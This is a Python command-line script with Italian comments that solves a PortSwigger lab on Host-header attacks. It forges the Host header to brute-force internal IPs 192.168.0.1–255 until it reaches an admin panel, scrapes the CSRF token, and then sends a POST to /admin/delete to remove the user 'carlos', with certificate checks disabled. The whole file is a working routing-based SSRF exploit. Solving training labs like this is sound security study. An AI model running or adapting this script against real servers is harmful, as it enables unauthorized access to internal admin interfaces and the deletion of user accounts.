import typer
import re
import requests
import urllib3
from rich.console import Console

# Disabilita i warning per certificati SSL non verificati
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = typer.Typer()
console = Console()

@app.command()
def exploit(target_url: str):
    """
    Soluzione PortSwigger: Host Header Attack con Brute Force IP interno.
    Scansiona 192.168.0.1-255 con log dettagliati della costruzione richiesta.
    """
    
    # Pulizia URL
    target_url = target_url.rstrip("/")
    if "https://" not in target_url:
        console.print("[bold red]L'URL deve essere HTTPS.[/bold red]")
        return

    console.print(f"[blue][*] External Target:[/blue] {target_url}")

    # Creazione della sessione
    s = requests.Session()
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"

    found_admin_ip = None
    csrf_token = None

    # ---------------------------------------------------------
    # FASE 1: Scanning (Brute Force Host Header)
    # ---------------------------------------------------------
    console.print("\n[yellow][1] Scanning subnet interna 192.168.0.x...[/yellow]")
    console.print("[dim]Avvio sequenza di manipolazione Host Header (Livello Applicazione)[/dim]\n")

    for i in range(1, 256):
        current_ip = f"192.168.0.{i}"
        
        # --- STAMPA DI DEBUG RICHIESTA ---
        # Mostriamo cosa stiamo facendo prima di inviare
        console.print(f"[bold cyan][*] Testing IP suffix: .{i}[/bold cyan]")
        
        req_get = requests.Request(
            method='GET',
            url=f"{target_url}/admin",
            headers={"User-Agent": user_agent}
        )
        prepped_get = s.prepare_request(req_get)
        
        # OVERRIDE HOST HEADER
        prepped_get.headers['Host'] = current_ip

        # Visualizziamo la costruzione della richiesta
        console.print(f"    -> [dim]Target URI:[/dim] {target_url}/admin")
        console.print(f"    -> [magenta]Forged Host Header:[/magenta] {prepped_get.headers['Host']}")

        try:
            # Timeout breve (0.5s)
            resp_get = s.send(prepped_get, verify=False, allow_redirects=False, timeout=0.5)
            
            # Feedback risultato HTTP
            if resp_get.status_code == 200:
                console.print(f"    -> [bold green][!] 200 OK - Admin Panel TROVATO![/bold green]")
                found_admin_ip = current_ip
                
                # Estrazione CSRF
                csrf_match = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"', resp_get.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                
                break # Trovato! Interrompiamo il ciclo.
            else:
                # Se non è 200, stampiamo il codice di stato in grigio
                console.print(f"    -> [dim]Status: {resp_get.status_code} (Ignored)[/dim]")
        
        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout):
            console.print(f"    -> [dim red]Timeout (Host non raggiungibile o filtrato)[/dim red]")
            continue 
        except Exception as e:
            console.print(f"    -> [red]Error: {e}[/red]")
            pass

    # Controllo esito scansione
    if not found_admin_ip:
        console.print("\n[bold red][!] Scansione terminata. Admin panel NON trovato.[/bold red]")
        return

    if not csrf_token:
        console.print("\n[bold red][!] Admin panel trovato ma token CSRF mancante.[/bold red]")
        return

    console.print(f"\n[green][+] Target IP Interno identificato: {found_admin_ip}[/green]")
    console.print(f"[green][+] CSRF Token estratto: {csrf_token}[/green]")

    # ---------------------------------------------------------
    # FASE 2: POST /admin/delete
    # ---------------------------------------------------------
    console.print(f"\n[yellow][2] Eliminazione utente Carlos...[/yellow]")

    payload = {
        "username": "carlos",
        "csrf": csrf_token
    }

    req_post = requests.Request(
        method='POST',
        url=f"{target_url}/admin/delete",
        data=payload,
        headers={
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded"
        }
    )

    prepped_post = s.prepare_request(req_post)
    prepped_post.headers['Host'] = found_admin_ip
    
    console.print(f"    -> [magenta]Injecting Host Header nella POST:[/magenta] {found_admin_ip}")

    try:
        resp_post = s.send(prepped_post, verify=False, allow_redirects=False)
    except Exception as e:
        console.print(f"[red]Errore invio POST: {e}[/red]")
        return

    if resp_post.status_code == 302:
        console.print(f"[bold green][SUCCESS] Ricevuto 302! Lab risolto. Utente eliminato.[/bold green]")
        console.print(f"[dim]Redirect location: {resp_post.headers.get('Location')}[/dim]")
    elif resp_post.status_code == 200:
        console.print(f"[yellow]Ricevuto 200 OK. Verifica manualmente.[/yellow]")
    else:
        console.print(f"[red]Risposta inattesa alla POST: {resp_post.status_code}[/red]")

if __name__ == "__main__":
    app()
